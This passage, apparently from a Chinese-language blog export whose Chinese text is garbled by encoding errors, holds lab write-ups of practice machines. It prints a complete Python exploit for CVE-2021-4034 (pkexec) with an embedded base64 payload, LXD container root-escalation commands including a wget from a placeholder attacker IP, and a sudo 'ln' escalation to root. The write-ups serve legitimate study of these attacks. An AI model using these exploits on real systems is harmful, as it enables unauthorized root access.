class="literal">true</span></span><br><span class="line">Device mydevice added <span class="keyword">to</span> ignite</span><br><span class="line">hackable_3<span class="variable">@ubuntu20</span>:<span class="operator">~</span>$ lxc <span class="keyword">start</span> ignite</span><br><span class="line">hackable_3<span class="variable">@ubuntu20</span>:<span class="operator">~</span>$ lxc <span class="keyword">exec</span> ignite <span class="operator">/</span>bin<span class="operator">/</span>sh</span><br><span class="line"><span class="operator">~</span> # id</span><br><span class="line">uid<span class="operator">=</span><span class="number">0</span>(root) gid<span class="operator">=</span><span class="number">0</span>(root)</span><br></pre></td></tr></table></figure></div>
<p>åŸç†<br>lxd ç»„ç”¨æˆ·å¯ä»¥ä»¥ä»»æ„é•œåƒåˆ›å»ºå®¹å™¨ï¼Œå¹¶å°†å½“å‰ç³»ç»Ÿæ ¹ç›®å½•æŒ‚è½½åˆ°å·²åˆ›å»ºå®¹å™¨çš„ mnt ç›®å½•ä¸‹ï¼Œ&#x2F;mnt&#x2F;root&#x2F; ç›®å½•æ˜¯ä¸€ä¸ªå®Œæ•´çš„æ ¹ç›®å½•ï¼Œå¯ä»¥ä½¿ç”¨ chroot è·å–åˆ°è¿™ä¸ªæ ¹ç›®å½•çš„å®Œæ•´ root æƒé™ã€‚<br>æ‰€ä»¥ç°åœ¨æŸ¥æ–‡ä»¶å°±åœ¨&#x2F;mnt&#x2F;rootç›®å½•ä¸‹é¢</p>
<h2 id="ææƒæ–¹æ³•2"><a href="#ææƒæ–¹æ³•2" class="headerlink" title="ææƒæ–¹æ³•2"></a>ææƒæ–¹æ³•2</h2><p>åˆšæ‰ç”¨linpeas.shæ‰«æçš„æ—¶å€™æ‰«å‡ºä¸€ä¸ªæ¼æ´<br><img src="https://pic1.imgdb.cn/item/67ab4752d0e0a243d4fe6489.png"><br>å¯ä»¥æ‰¾åˆ°pkexecçš„æ¼æ´åˆ©ç”¨è„šæœ¬ï¼Œä¸è¿‡ä¸æ˜¯è¿™é‡Œæ˜¾ç¤ºçš„ä¸¤ä¸ªï¼Œæ˜¯CVE-2021-4034<br>è¿™é‡Œæˆ‘ä»¬é€‰æ‹©ç”¨pyè„šæœ¬ï¼Œä¸ç”¨å…ˆç¼–è¯‘ï¼Œæ–¹ä¾¿è€Œä¸”åœ¨é¶æœºä¸ŠæˆåŠŸç‡é«˜</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># CVE-2021-4034 in Python</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Joe Ammond (joe@ammond.org)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This was just an experiment to see whether I could get this to work</span></span><br><span class="line"><span class="comment"># in Python, and to play around with ctypes</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># This was completely cribbed from blasty&#x27;s original C code:</span></span><br><span class="line"><span class="comment"># https://haxx.in/files/blasty-vs-pkexec.c</span></span><br><span class="line"></span><br><span class="line">import base64</span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">from ctypes import *</span><br><span class="line">from ctypes.util import find_library</span><br><span class="line"></span><br><span class="line"><span class="comment"># Payload, base64 encoded ELF shared object. Generate with:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># msfvenom -p linux/x64/exec -f elf-so PrependSetuid=true | base64</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># The PrependSetuid=true is important, without it you&#x27;ll just get</span></span><br><span class="line"><span class="comment"># a shell as the user and not root.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Should work with any msfvenom payload, tested with linux/x64/exec</span></span><br><span class="line"><span class="comment"># and linux/x64/shell_reverse_tcp</span></span><br><span class="line"></span><br><span class="line">payload_b64 = <span class="string">b&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAkgEAAAAAAABAAAAAAAAAALAAAAAAAAAAAAAAAEAAOAAC</span></span><br><span class="line"><span class="string">AEAAAgABAAEAAAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAArwEAAAAAAADMAQAAAAAAAAAQ</span></span><br><span class="line"><span class="string">AAAAAAAAAgAAAAcAAAAwAQAAAAAAADABAAAAAAAAMAEAAAAAAABgAAAAAAAAAGAAAAAAAAAAABAA</span></span><br><span class="line"><span class="string">AAAAAAABAAAABgAAAAAAAAAAAAAAMAEAAAAAAAAwAQAAAAAAAGAAAAAAAAAAAAAAAAAAAAAIAAAA</span></span><br><span class="line"><span class="string">AAAAAAcAAAAAAAAAAAAAAAMAAAAAAAAAAAAAAJABAAAAAAAAkAEAAAAAAAACAAAAAAAAAAAAAAAA</span></span><br><span class="line"><span class="string">AAAAAAAAAAAAAAAAAAAAAAAAAAwAAAAAAAAAkgEAAAAAAAAFAAAAAAAAAJABAAAAAAAABgAAAAAA</span></span><br><span class="line"><span class="string">AACQAQAAAAAAAAoAAAAAAAAAAAAAAAAAAAALAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span></span><br><span class="line"><span class="string">AAAASDH/amlYDwVIuC9iaW4vc2gAmVBUX1JeajtYDwU=</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = base64.b64decode(payload_b64)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set the environment for the call to execve()</span></span><br><span class="line">environ = [</span><br><span class="line">        <span class="string">b&#x27;exploit&#x27;</span>,</span><br><span class="line">        <span class="string">b&#x27;PATH=GCONV_PATH=.&#x27;</span>,</span><br><span class="line">        <span class="string">b&#x27;LC_MESSAGES=en_US.UTF-8&#x27;</span>,</span><br><span class="line">        <span class="string">b&#x27;XAUTHORITY=../LOL&#x27;</span>,</span><br><span class="line">        None</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Find the C library to call execve() directly, as Python helpfully doesn&#x27;t</span></span><br><span class="line"><span class="comment"># allow us to call execve() with no arguments.</span></span><br><span class="line">try:</span><br><span class="line">    libc = CDLL(find_library(<span class="string">&#x27;c&#x27;</span>))</span><br><span class="line">except:</span><br><span class="line">    print(<span class="string">&#x27;[!] Unable to find the C library, wtf?&#x27;</span>)</span><br><span class="line">    sys.<span class="keyword">exit</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create the shared library from the payload</span></span><br><span class="line">print(<span class="string">&#x27;[+] Creating shared library for exploit code.&#x27;</span>)</span><br><span class="line">try:</span><br><span class="line">    with open(<span class="string">&#x27;payload.so&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) as f:</span><br><span class="line">        f.write(payload)</span><br><span class="line">except:</span><br><span class="line">    print(<span class="string">&#x27;[!] Failed creating payload.so.&#x27;</span>)</span><br><span class="line">    sys.<span class="keyword">exit</span>()</span><br><span class="line">os.chmod(<span class="string">&#x27;payload.so&#x27;</span>, <span class="number">0</span>o0755)</span><br><span class="line"></span><br><span class="line"><span class="comment"># make the GCONV_PATH directory</span></span><br><span class="line">try:</span><br><span class="line">    os.mkdir(<span class="string">&#x27;GCONV_PATH=.&#x27;</span>)</span><br><span class="line">except FileExistsError:</span><br><span class="line">    print(<span class="string">&#x27;[-] GCONV_PATH=. directory already exists, continuing.&#x27;</span>)</span><br><span class="line">except:</span><br><span class="line">    print(<span class="string">&#x27;[!] Failed making GCONV_PATH=. directory.&#x27;</span>)</span><br><span class="line">    sys.<span class="keyword">exit</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create a temp exploit file</span></span><br><span class="line">try:</span><br><span class="line">    with open(<span class="string">&#x27;GCONV_PATH=./exploit&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) as f:</span><br><span class="line">        f.write(<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">except:</span><br><span class="line">    print(<span class="string">&#x27;[!] Failed creating exploit file&#x27;</span>)</span><br><span class="line">    sys.<span class="keyword">exit</span>()</span><br><span class="line">os.chmod(<span class="string">&#x27;GCONV_PATH=./exploit&#x27;</span>, <span class="number">0</span>o0755)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create directory to hold gconf-modules configuration file</span></span><br><span class="line">try:</span><br><span class="line">    os.mkdir(<span class="string">&#x27;exploit&#x27;</span>)</span><br><span class="line">except FileExistsError:</span><br><span class="line">    print(<span class="string">&#x27;[-] exploit directory already exists, continuing.&#x27;</span>)</span><br><span class="line">except:</span><br><span class="line">    print(<span class="string">&#x27;[!] Failed making exploit directory.&#x27;</span>)</span><br><span class="line">    sys.<span class="keyword">exit</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create gconf config file</span></span><br><span class="line">try:</span><br><span class="line">    with open(<span class="string">&#x27;exploit/gconv-modules&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) as f:</span><br><span class="line">        f.write(<span class="string">b&#x27;module  UTF-8//    INTERNAL    ../payload    2\n&#x27;</span>);</span><br><span class="line">except:</span><br><span class="line">    print(<span class="string">&#x27;[!] Failed to create gconf-modules config file.&#x27;</span>)</span><br><span class="line">    sys.<span class="keyword">exit</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Convert the environment to an array of char*</span></span><br><span class="line">environ_p = (c_char_p * len(environ))()</span><br><span class="line">environ_p[:] = environ</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;[+] Calling execve()&#x27;</span>)</span><br><span class="line"><span class="comment"># Call execve() with NULL arguments</span></span><br><span class="line">libc.execve(<span class="string">b&#x27;/usr/bin/pkexec&#x27;</span>, c_char_p(None), environ_p)</span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">jubiscleudo<span class="variable">@ubuntu20</span><span class="symbol">:~</span><span class="variable">$ </span>vi a.py</span><br><span class="line">jubiscleudo<span class="variable">@ubuntu20</span><span class="symbol">:~</span><span class="variable">$ </span>chmod +x a.py</span><br><span class="line">jubiscleudo<span class="variable">@ubuntu20</span><span class="symbol">:~</span><span class="variable">$ </span>./a.py</span><br><span class="line">[+] <span class="title class_">Creating</span> shared library <span class="keyword">for</span> exploit code.</span><br><span class="line">[+] <span class="title class_">Calling</span> execve()</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">1001</span>(jubiscleudo) groups=<span class="number">1001</span>(jubiscleudo)</span><br><span class="line"><span class="comment"># pwd</span></span><br><span class="line">/home/jubiscleudo</span><br></pre></td></tr></table></figure></div>

<h2 id="ææƒè¯¦ç»†è¿‡ç¨‹"><a href="#ææƒè¯¦ç»†è¿‡ç¨‹" class="headerlink" title="ææƒè¯¦ç»†è¿‡ç¨‹"></a>ææƒè¯¦ç»†è¿‡ç¨‹</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ï¼ˆ1ï¼‰è·å– Alpine Linux é•œåƒ</span></span><br><span class="line">wget http://æ”»å‡»æœºIP/alpine-v3.13-x86_64-20210218_0139.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment">#lxdåˆå§‹åŒ–</span></span><br><span class="line">lxd init   <span class="comment">#ä¸€è·¯å›è½¦</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ç„¶åå¯¼å…¥é•œåƒï¼š</span></span><br><span class="line">lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --<span class="built_in">alias</span> image_name</span><br><span class="line"></span><br><span class="line"><span class="comment">#åˆ›å»ºç‰¹æƒå®¹å™¨</span></span><br><span class="line">lxc init image_name ignite -c security.privileged=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#æŒ‚è½½å®¿ä¸»æœºçš„æ ¹ç›®å½•</span></span><br><span class="line">lxc config device add ignite mydevice disk <span class="built_in">source</span>=/ path=/mnt/root recursive=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#å¯åŠ¨å¹¶è¿›å…¥å®¹å™¨</span></span><br><span class="line">lxc start ignite </span><br><span class="line">lxc <span class="built_in">exec</span> ignite /bin/sh</span><br><span class="line"></span><br><span class="line"><span class="comment">#åˆ‡æ¢åˆ°å®¿ä¸»æœºç¯å¢ƒ</span></span><br><span class="line"><span class="built_in">chroot</span> /mnt/root</span><br></pre></td></tr></table></figure></div>
<p>æ€»ç»“ï¼šå­¦åˆ°äº†ä»€ä¹ˆæ˜¯lxdï¼Œä»¥åŠç”¨è¿™ä¸ªææƒçš„æ–¹å¼ï¼Œlxdææƒåçš„ç›®å½•åœ¨&#x2F;mnt&#x2F;rootï¼Œä»¥åŠå†…æ ¸ææƒçš„ä½¿ç”¨æ–¹å¼ã€‚<br>ç”±äºæˆ‘æ˜¯armæœºå™¨ï¼Œå‰é¢åœ¨ç¼–è¯‘x86æ–‡ä»¶çš„æ—¶å€™è¿˜é‡åˆ°é—®é¢˜ï¼Œå­¦ä¼šäº†äº¤å‰ç¼–è¯‘çš„å·¥å…·x86_64-linux-gnu-gcc<br>ä»¥åŠåœ¨æœ¬æœºç¼–è¯‘cè¯­è¨€éœ€è¦ç”¨-staticè®©ç¼–è¯‘å‡ºæ¥çš„æ–‡ä»¶ä¸ç”¨åŠ¨æ€åº“ï¼Œç”¨è„šæœ¬æœ‰pyå°±ä¸ç”¨c</p>
]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>é¶åœº</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-helium</title>
    <url>/posts/43260.html</url>
    <content><![CDATA[<p>HMV-heliumé¶åœºå¤ç›˜</p>
<span id="more"></span>
<p><img src="https://pic1.imgdb.cn/item/679f6263d0e0a243d4f99728.png"></p>
<h1 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># nmap -A 192.168.240.53 </span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">02</span> <span class="number">20</span>:<span class="number">18</span> CST</span><br><span class="line">Nmap scan report for <span class="number">192.168</span>.<span class="number">240.53</span></span><br><span class="line">Host is up (<span class="number">0.0020</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span> open  ssh     OpenSSH <span class="number">7.9</span>p1 Debian <span class="number">10</span><span class="operator">+</span>deb10u2 (protocol <span class="number">2.0</span>)</span><br><span class="line">| <span class="params">ssh-hostkey:</span> </span><br><span class="line">|   <span class="number">2048</span> <span class="number">12</span>:f6:<span class="number">55</span>:<span class="number">5</span>f:c6:fa:fb:<span class="number">14</span>:<span class="number">15</span>:ae:<span class="number">4</span>a:<span class="number">2</span>b:<span class="number">38</span>:d8:<span class="number">4</span>a:<span class="number">30</span> (RSA)</span><br><span class="line">|   <span class="number">256</span> b7:ac:<span class="number">87</span>:<span class="number">6</span>d:c4:f9:e3:<span class="number">9</span>a:d4:<span class="number">6</span>e:e0:<span class="number">4</span>f:da:aa:<span class="number">22</span>:<span class="number">20</span> (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> fe:e8:<span class="number">05</span>:af:<span class="number">23</span>:<span class="number">4</span>d:<span class="number">3</span>a:<span class="number">82</span>:<span class="number">2</span>a:<span class="number">64</span>:<span class="number">9</span>b:f7:<span class="number">35</span>:e4:<span class="number">44</span>:<span class="number">4</span>a (ED25519)</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span> open  http    nginx <span class="number">1.14</span>.<span class="number">2</span></span><br><span class="line">|<span class="params">_http-server-header:</span> nginx<span class="symbol">/1.14.2</span></span><br><span class="line">|<span class="params">_http-title:</span> RELAX</span><br><span class="line">MAC <span class="params">Address:</span> <span class="number">56</span>:BD:<span class="number">76</span>:<span class="number">3</span>F:EB:<span class="number">82</span> (Unknown)</span><br><span class="line">Device <span class="params">type:</span> general purpose</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">4</span>.X|<span class="number">5</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">4.15</span> <span class="operator">-</span> <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line">Service <span class="params">Info:</span> <span class="params">OS:</span> Linux; <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">2.03</span> ms <span class="number">192.168</span>.<span class="number">240.53</span></span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">8.43</span> seconds</span><br></pre></td></tr></table></figure></div>
<p>å¼€æ”¾22å’Œ80ç«¯å£ ç›´æ¥è¿›å…¥webéƒ¨åˆ†</p>
<h1 id="webæ¢æµ‹"><a href="#webæ¢æµ‹" class="headerlink" title="webæ¢æµ‹"></a>webæ¢æµ‹</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# curl http://192.168.240.53         </span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>RELAX<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Please paul, stop uploading weird .wav files using /upload_sound --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&#x27;screen-1.jpg&#x27;</span>);</span></span><br><span class="line"><span class="language-css">  <span class="attribute">background-repeat</span>: no-repeat;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">background-attachment</span>: fixed; </span></span><br><span class="line"><span class="language-css">  <span class="attribute">background-size</span>: <span class="number">100%</span> <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;bootstrap.min.css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">&quot;relax.wav&quot;</span> <span class="attr">preload</span>=<span class="string">&quot;auto loop&quot;</span> <span class="attr">controls</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œå‘Šè¯‰äº†ä¸€ä¸ªç”¨æˆ·åpaul è¿˜æœ‰ä¸€ä¸ªç›®å½•&#x2F;upload_sound è¿˜æœ‰ä¸€ä¸ªrelax.wavå¯ä»¥ä¸‹è½½<br>ä»¥ä¸ºæ˜¯wavéšå†™æœ‰å…³ï¼Œä½†æ˜¯æˆ‘å¯¹miscä¸æ˜¯å¾ˆç†Ÿæ‚‰ï¼Œä¹Ÿæ£é¼“äº†è¿™ä¸ªwavåŠå¤©æ²¡æœ‰ä¿¡æ¯ï¼Œç»“æœæ˜¯æˆ‘æé”™æ–¹å‘äº†<br>è¿™ä¸ªæºç ä¸­çš„bootstrap.min.csså¯ä»¥è®¿é—®ï¼Œæœ‰ä¸€ä¸ªwavæ–‡ä»¶ï¼Œå®é™…ä¸Šè¦åˆ†æçš„æ˜¯è¿™ä¸ªwavæ–‡ä»¶</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# curl http://192.168.240.53/bootstrap.min.css    </span><br><span class="line">/yay/mysecretsound.wav</span><br></pre></td></tr></table></figure></div>
<p>æ‰“å¼€audacityé€‰æ‹©é¢‘è°± å¯ä»¥çœ‹åˆ°æœ‰æ–‡å­—å‡ºç° è¿™ä¸ªå°±æ˜¯å¯†ç <br><img src="https://pic1.imgdb.cn/item/679f74bbd0e0a243d4f99a53.png"><br><img src="https://pic1.imgdb.cn/item/679f74b9d0e0a243d4f99a52.png"><br>dancingpassyo<br>æˆåŠŸæ‹¿åˆ°ç”¨æˆ·shell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VBNET"><figure class="iseeu highlight /vbnet"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# ssh paul@<span class="number">192.168</span>.<span class="number">240.53</span>                     </span><br><span class="line">The authenticity <span class="keyword">of</span> host <span class="comment">&#x27;192.168.240.53 (192.168.240.53)&#x27; can&#x27;t be established.</span></span><br><span class="line">ED25519 <span class="keyword">key</span> fingerprint <span class="built_in">is</span> SHA256:y4b6laUdkY6jY95p0UousHuja503C9EIqNNrMD5hoqA.</span><br><span class="line">This <span class="keyword">key</span> <span class="built_in">is</span> <span class="built_in">not</span> known <span class="keyword">by</span> any other names.</span><br><span class="line">Are you sure you want <span class="keyword">to</span> <span class="keyword">continue</span> connecting (yes/no/[fingerprint])? yes</span><br><span class="line"><span class="symbol">Warning:</span> Permanently added <span class="comment">&#x27;192.168.240.53&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line">paul@<span class="number">192.168</span>.<span class="number">240.53</span><span class="comment">&#x27;s password: </span></span><br><span class="line">Permission denied, please <span class="keyword">try</span> again.</span><br><span class="line">paul@<span class="number">192.168</span>.<span class="number">240.53</span><span class="comment">&#x27;s password: </span></span><br><span class="line">Linux helium <span class="number">4.19</span>.<span class="number">0</span>-<span class="number">12</span>-amd64 #<span class="number">1</span> SMP Debian <span class="number">4.19</span>.<span class="number">152</span>-<span class="number">1</span> (<span class="number">2020</span>-<span class="number">10</span>-<span class="number">18</span>) x86_64</span><br><span class="line"></span><br><span class="line">The programs included <span class="keyword">with</span> the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> <span class="keyword">each</span> program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes <span class="keyword">with</span> ABSOLUTELY NO WARRANTY, <span class="keyword">to</span> the extent</span><br><span class="line">permitted <span class="keyword">by</span> applicable law.</span><br><span class="line">Last login: Sun Nov <span class="number">22</span> <span class="number">14</span>:<span class="number">31</span>:<span class="number">51</span> <span class="number">2020</span> <span class="keyword">from</span> <span class="number">192.168</span>.<span class="number">1.58</span></span><br><span class="line">paul@helium:~$ </span><br></pre></td></tr></table></figure></div>

<h1 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h1><p>æœ‰ä¸€ä¸ªsudoæƒé™ å¯ä»¥æ‰§è¡Œä¸€ä¸ªç¨‹åº</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">paul<span class="variable">@helium</span><span class="symbol">:~</span><span class="variable">$ </span>sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> paul on <span class="symbol">helium:</span></span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> paul may run the following commands on <span class="symbol">helium:</span></span><br><span class="line">    (<span class="title class_">ALL</span> : <span class="title class_">ALL</span>) <span class="symbol">NOPASSWD:</span> /usr/bin/ln</span><br><span class="line">paul<span class="variable">@helium</span><span class="symbol">:~</span><span class="variable">$ </span>file /usr/bin/ln</span><br><span class="line">/usr/bin/<span class="symbol">ln:</span> <span class="title class_">ELF</span> <span class="number">64</span>-bit <span class="title class_">LSB</span> pie executable, x86<span class="number">-64</span>, version <span class="number">1</span> (<span class="title class_">SYSV</span>), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64</span>.so.<span class="number">2</span>, <span class="keyword">for</span> <span class="title class_">GNU</span>/<span class="title class_">Linux</span> <span class="number">3.2</span>.<span class="number">0</span>, <span class="title class_">BuildID</span>[sha1]=<span class="number">90900</span>bc68d91aa5931e338d6445b520777431a02, stripped</span><br></pre></td></tr></table></figure></div>
<p>æ‰¾åˆ°ææƒå‘½ä»¤</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">ln</span> -fs /bin/sh /bin/ln</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">ln</span></span><br></pre></td></tr></table></figure></div>
<p>æ‹¿åˆ°rootshell  è§£å†³</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">paul<span class="variable">@helium</span><span class="symbol">:~</span><span class="variable">$ </span>sudo ln -fd /bin/bash /bin/ln</span><br><span class="line">paul<span class="variable">@helium</span><span class="symbol">:~</span><span class="variable">$ </span>sudo ln</span><br><span class="line">root<span class="variable">@helium</span><span class="symbol">:/home/paul</span><span class="comment"># </span></span><br></pre></td></tr></table></figure></div>
<h2 id="ææƒå‘½ä»¤è§£é‡Š"><a href="#ææƒå‘½ä»¤è§£é‡Š" class="headerlink" title="ææƒå‘½ä»¤è§£é‡Š"></a>ææƒå‘½ä»¤è§£é‡Š</h2><p>ğŸ“Œ ln å‘½ä»¤è§£é‡Š<br>ln æ˜¯ Linux ç³»ç»Ÿä¸­çš„ åˆ›å»ºé“¾æ¥å‘½ä»¤ï¼Œç”¨äºåˆ›å»º ç¡¬é“¾æ¥ æˆ– ç¬¦å·é“¾æ¥ï¼ˆè½¯é“¾æ¥ï¼‰ã€‚</p>
<p>ğŸ” ln å‘½ä»¤çš„åŸºæœ¬ç”¨æ³•</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ln</span> [é€‰é¡¹] ç›®æ ‡æ–‡ä»¶ ç›®æ ‡é“¾æ¥</span><br></pre></td></tr></table></figure></div>
